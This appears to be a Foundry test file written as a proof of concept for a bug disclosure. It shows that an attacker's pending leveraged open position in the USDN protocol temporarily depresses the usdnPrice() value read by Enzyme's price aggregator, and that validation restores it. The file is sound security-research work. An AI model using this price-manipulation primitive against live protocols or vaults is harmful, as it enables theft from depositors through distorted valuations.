// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

// This file is copied by CI into test/integration/UsdnProtocol/ of the exact deployed USDN snapshot.
import { UsdnProtocolBaseFixture } from "../../unit/UsdnProtocol/utils/Fixtures.sol";
import { IUsdnProtocolTypes } from "../../../src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";

/// @notice Proves that a pending leveraged open changes the value returned by USDN_PROTOCOL.usdnPrice(currentPrice),
/// exactly the view consumed by Enzyme's SmarDexUsdnNativeRateUsdAggregator, and that validation reverses the change.
contract PendingOpenNavPoC is UsdnProtocolBaseFixture {
    address internal constant ATTACKER = address(0xBEEF);

    function setUp() public {
        params = DEFAULT_PARAMS;
        // Isolate the primitive: funding/fees/rebase/imbalance limits are disabled.
        params.initialLong = 5 ether;
        _setUp(params);
    }

    function test_pendingOpenProfitTemporarilyDepressesUsdnNavAndValidationRestoresIt() public {
        uint128 p0 = params.initialPrice; // $2,000
        uint128 p1 = uint128(uint256(p0) * 105 / 100); // hypothetical current market price: +5%

        // Pure negative control. usdnPrice() is a view, so this does not mutate Protocol state.
        // It is also exactly the Protocol endpoint used by Enzyme's USDN price feed.
        uint256 baselineNavAtP1 = protocol.usdnPrice(p1);
        uint256 navAtP0 = protocol.usdnPrice(p0);

        // Stop after INITIATE. The unvalidated position is already included in global totalExpo and balances
        // at its temporary p0 entry price.
        IUsdnProtocolTypes.PositionId memory posId = setUpUserPositionInLong(
            OpenParams({
                user: ATTACKER,
                untilAction: IUsdnProtocolTypes.ProtocolAction.InitiateOpenPosition,
                positionSize: 2 ether,
                desiredLiqPrice: 1600 ether,
                price: p0
            })
        );

        (IUsdnProtocolTypes.Position memory pendingPos,) = protocol.getLongPosition(posId);
        assertFalse(pendingPos.validated, "position must still be pending");

        // Critical observation: without any intervening state-changing liquidation/update, asking the same
        // usdnPrice() view for current price p1 now prices the pending position's temporary profit against the vault.
        // Enzyme's USDN aggregator performs this same view computation on every valuation.
        uint256 navDuringPendingAtP1 = protocol.usdnPrice(p1);
        uint256 navAfterInitiateAtP0 = protocol.usdnPrice(p0);

        // Validate at p1. Production USDN code explicitly cancels PnL accrued by the temporary pre-validation
        // position and reprices the final position at the validation entry price.
        vm.prank(ATTACKER);
        (IUsdnProtocolTypes.LongActionOutcome outcome,) =
            protocol.validateOpenPosition(payable(ATTACKER), abi.encode(p1), EMPTY_PREVIOUS_DATA);
        assertEq(uint256(outcome), uint256(IUsdnProtocolTypes.LongActionOutcome.Processed), "open validation outcome");

        uint256 navAfterValidationAtP1 = protocol.usdnPrice(p1);

        emit log_named_uint("NAV_AT_P0_BEFORE", navAtP0);
        emit log_named_uint("BASELINE_NAV_AT_P1_WITHOUT_PENDING_OPEN", baselineNavAtP1);
        emit log_named_uint("NAV_AT_P0_AFTER_INITIATE", navAfterInitiateAtP0);
        emit log_named_uint("NAV_AT_P1_DURING_PENDING_OPEN", navDuringPendingAtP1);
        emit log_named_uint("NAV_AT_P1_AFTER_VALIDATION", navAfterValidationAtP1);
        emit log_named_uint(
            "PENDING_OPEN_NAV_DEPRESSION_BPS",
            (baselineNavAtP1 - navDuringPendingAtP1) * 10_000 / baselineNavAtP1
        );
        emit log_named_uint(
            "VALIDATION_NAV_RECOVERY_BPS",
            (navAfterValidationAtP1 - navDuringPendingAtP1) * 10_000 / navDuringPendingAtP1
        );

        // At the temporary entry price there is no artificial PnL.
        assertApproxEqRel(navAfterInitiateAtP0, navAtP0, 0.0001 ether, "initiate should preserve NAV at p0");

        // At p1, the unvalidated profitable long temporarily takes value from the vault/USDN price.
        assertLt(navDuringPendingAtP1, baselineNavAtP1, "pending long must depress USDN NAV at p1");

        // At the exact same p1, validation must reverse that temporary loss.
        assertGt(navAfterValidationAtP1, navDuringPendingAtP1, "validation must restore temporary USDN NAV loss");
        assertApproxEqRel(
            navAfterValidationAtP1,
            baselineNavAtP1,
            0.0005 ether,
            "after validation NAV should return to no-pending baseline within 5 bps"
        );
    }
}
